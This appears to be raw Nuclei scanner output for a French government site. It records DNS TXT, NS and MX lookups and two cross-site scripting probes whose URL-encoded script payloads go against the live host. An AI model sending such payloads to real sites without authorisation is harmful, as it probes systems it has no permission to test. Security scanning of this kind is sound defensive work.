info.name: CLink Office 2.0 - Cross-Site Scripting
author: pikpikcu
info.description: CLink Office 2.0 is vulnerable to cross-site scripting in the index page of the management console and allows remote attackers to inject arbitrary web script or HTML via the lang parameter.

request:
GET /?lang=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Cp%20class=%22&p=1 HTTP/1.1
Host: potentiel.beta.gouv.fr

info.name: Adminer <=4.8.0 - Cross-Site Scripting
author: daffainfo
info.description: Adminer 4.6.1 to 4.8.0 contains a cross-site scripting vulnerability which affects users of MySQL, MariaDB, PgSQL, and SQLite in browsers without CSP when Adminer uses a `pdo_` extension to communicate with the database (it is used if the native extensions are not enabled).
info.remediation: This vulnerability is patched in version 4.8.1. As workarounds, one can use a browser supporting strict CSP or enable the native PHP extensions (e.g. `mysqli`) or disable displaying PHP errors (`display_errors`).

request:
GET /?server=db&username=root&db=mysql&table=event%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
Host: potentiel.beta.gouv.fr
User-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
response:
HTTP/1.1 200 OK Content-Length: 17646 Content-Security-Policy: default-src 'self' metabase.potentiel.beta.gouv.fr;connect-src 'self' 'unsafe-inline' analytics.potentiel.beta.gouv.fr;img-src 'self' data:;font-src 'self' data:;style-src 'self' data: 'unsafe-inline';script-src 'unsafe-inline' 'self' metabase.potentiel.beta.gouv.fr analytics.potentiel.beta.gouv.fr;object-src 'none' Content-Type: text/html; charset=utf-8 Cross-Origin-Opener-Policy: same-origin Cross-Origin-Resource-Policy: same-origin Date: Wed, 05 Oct 2022 03:52:24 GMT Etag: W/"44ee-MOVt+0uq1vVT0oe+aKNdENj/HTA" Expect-Ct: max-age=0 Keep-Alive: timeout=5 Origin-Agent-Cluster: ?1 Referrer-Policy: strict-origin Sozu-Id: 01GEK4BVSERN39A4072Q5D92K6 Strict-Transport-Security: max-age=63072000; preload X-Content-Type-Options: nosniff X-Dns-Prefetch-Control: off X-Download-Options: noopen X-Frame-Options: SAMEORIGIN X-Permitted-Cross-Domain-Policies: none X-Xss-Protection: 0 Potentiel - Suivi des Projets d'Energies Renouvelables

info.name: DNS TXT Record Detected
author: pdteam
info.description: A DNS TXT record was detected. The TXT record lets a domain admin leave notes on a DNS server.

request:
;; opcode: QUERY, status: NOERROR, id: 365
;; flags: rd ad; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version 0; flags: ; udp: 4096

;; QUESTION SECTION:
;potentiel.beta.gouv.fr.	IN	 TXT
response:
;; opcode: QUERY, status: NOERROR, id: 365
;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version 0; flags: ; udp: 1232

;; QUESTION SECTION:
;potentiel.beta.gouv.fr.	IN	 TXT

;; ANSWER SECTION:
potentiel.beta.gouv.fr.	300	IN	TXT	"google-site-verification=TFLKznVdoFHp8aVSWp4Wjg00cOLTfJR6Vldor6flWYE"
potentiel.beta.gouv.fr.	300	IN	TXT	"v=spf1 include:_spf.alwaysdata.com include:spf.mailjet.com ?all"

info.name: NS Record Detection
author: pdteam
info.description: An NS record was detected. An NS record delegates a subdomain to a set of name servers.

request:
;; opcode: QUERY, status: NOERROR, id: 52588
;; flags: rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version 0; flags: ; udp: 4096

;; QUESTION SECTION:
;potentiel.beta.gouv.fr.	IN	 NS
response:
;; opcode: QUERY, status: NOERROR, id: 52588
;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version 0; flags: ; udp: 512

;; QUESTION SECTION:
;potentiel.beta.gouv.fr.	IN	 NS

;; ANSWER SECTION:
potentiel.beta.gouv.fr.	300	IN	NS	dns2.alwaysdata.com.
potentiel.beta.gouv.fr.	300	IN	NS	dns1.alwaysdata.com.

info.name: OpenSSH Service Detection
author: r3dg33k
daffainfo
iamthefrogy
info.description: OpenSSH is the premier connectivity tool for remote login with the SSH protocol. It encrypts all traffic to eliminate eavesdropping, connection hijacking, and other attacks. In addition, OpenSSH provides a large suite of secure tunneling capabilities, several authentication methods, and sophisticated configuration options.

info.name: MX Record Detection
author: pdteam
info.description: An MX record was detected. MX records direct emails to a mail exchange server.

request:
;; opcode: QUERY, status: NOERROR, id: 38992
;; flags: rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version 0; flags: ; udp: 4096

;; QUESTION SECTION:
;potentiel.beta.gouv.fr.	IN	 MX
response:
;; opcode: QUERY, status: NOERROR, id: 38992
;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version 0; flags: ; udp: 1232

;; QUESTION SECTION:
;potentiel.beta.gouv.fr.	IN	 MX

;; ANSWER SECTION:
potentiel.beta.gouv.fr.	300	IN	MX	10 mx1.alwaysdata.com.
potentiel.beta.gouv.fr.	300	IN	MX	20 mx2.alwaysdata.com.

info.name: WordPress My Calendar <= 3.1.9 - Cross-Site Scripting

dhiyaneshdk
